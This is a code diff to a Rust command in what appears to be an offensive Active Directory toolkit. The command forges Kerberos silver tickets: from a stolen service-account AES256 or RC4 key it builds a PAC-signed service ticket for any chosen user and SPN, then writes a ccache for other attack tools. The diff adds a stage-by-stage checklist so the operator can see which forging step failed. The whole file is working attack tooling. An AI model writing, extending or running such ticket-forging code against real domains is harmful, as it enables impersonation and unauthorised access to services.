@@ -1,6 +1,7 @@
 //! Silver ticket: forge a service ticket (TGS) for an SPN with the target
 //! service account's AES256 key. Bypasses the KDC entirely at presentation.
 
+use crate::ui;
 use anyhow::{Context, Result};
 use clap::Parser;
 
@@ -38,10 +39,47 @@ pub(crate) struct SilverArgs {
 /// Silver ticket: forge a service ticket (TGS) for an SPN, sealed + PAC-signed with the target
 /// service account's AES256 key. Presented directly to the service (AP-REQ) without the KDC —
 /// so the KDC signature is unchecked. Emits a ccache for use with `-k` / KRB5CCNAME tooling.
+///
+/// Wraps `silver_impl` with a per-stage checklist ("parse service key → parse domain SID → forge
+/// silver TGS → write ccache") so the operator sees which step failed (bad key hex, malformed SID,
+/// forge error).
 pub(crate) async fn silver(a: SilverArgs) -> Result<()> {
+    let mut checklist = ui::StageChecklist::new([
+        "parse service key",
+        "parse domain SID",
+        "forge silver TGS",
+        "write ccache",
+    ]);
+    let result = silver_impl(a, &mut checklist).await;
+    match &result {
+        Ok(()) => checklist.render("Silver stages"),
+        Err(e) => {
+            let brief = format!("{e:#}")
+                .lines()
+                .next()
+                .unwrap_or("failed")
+                .chars()
+                .take(80)
+                .collect::<String>();
+            checklist.mark_current_failed(brief);
+            checklist.render("Silver stages (failed)");
+        }
+    }
+    result
+}
+
+async fn silver_impl(a: SilverArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
     use adhammer_kerberos::pac::ForgeIdentity;
 
     let key = crate::parse_forge_key(&a.service_aes256, a.rc4)?;
+    checklist.record_ok(
+        "parse service key",
+        if a.rc4 {
+            "RC4-HMAC (NT hash)"
+        } else {
+            "AES256-CTS-HMAC-SHA1-96"
+        },
+    );
     let subs: Vec<u32> = a
         .domain_sid
         .trim_start_matches("S-1-5-")
@@ -49,6 +87,7 @@ pub(crate) async fn silver(a: SilverArgs) -> Result<()> {
         .map(|x| x.parse::<u32>())
         .collect::<std::result::Result<_, _>>()
         .context("--domain-sid must be S-1-5-21-a-b-c")?;
+    checklist.record_ok("parse domain SID", format!("→ {}", a.domain_sid));
 
     let id = ForgeIdentity {
         user: a.user.clone(),
@@ -61,6 +100,10 @@ pub(crate) async fn silver(a: SilverArgs) -> Result<()> {
         extra_sids: vec![],
     };
     let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &a.spn, a.rc4)?;
+    checklist.record_ok(
+        "forge silver TGS",
+        format!("{}@{} for {} (rid {})", a.user, a.realm, a.spn, a.rid),
+    );
     println!(
         "[+] forged silver ticket: {}@{} for {} (rid {})",
         a.user, a.realm, a.spn, a.rid
@@ -68,7 +111,10 @@ pub(crate) async fn silver(a: SilverArgs) -> Result<()> {
     if let Some(out) = &a.out {
         let cc = adhammer_kerberos::silver_ccache(&tgt, &a.user, &a.spn)?;
         std::fs::write(out, &cc)?;
+        checklist.record_ok("write ccache", format!("→ {out} ({} bytes)", cc.len()));
         println!("[+] wrote ccache → {out} ({} bytes)", cc.len());
+    } else {
+        checklist.record_ok("write ccache", "skipped (no --out)");
     }
     Ok(())
 }
